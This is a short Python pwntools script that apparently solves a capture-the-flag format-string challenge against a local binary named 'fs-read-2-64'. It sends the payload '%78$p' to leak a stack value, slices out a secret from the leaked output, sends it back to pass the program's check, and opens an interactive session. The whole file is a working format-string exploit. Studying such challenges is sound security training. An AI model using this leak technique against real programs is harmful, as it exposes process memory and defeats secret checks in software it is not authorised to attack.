#!/usr/bin/env python

from pwn import *

p = process('./fs-read-2-64')

print(p.recv())

p.sendline("%78$p")

data = p.recv()
print(repr(data))

random = data[6:16]

print(random)

p.sendline(random)
print(p.recv())

p.interactive()
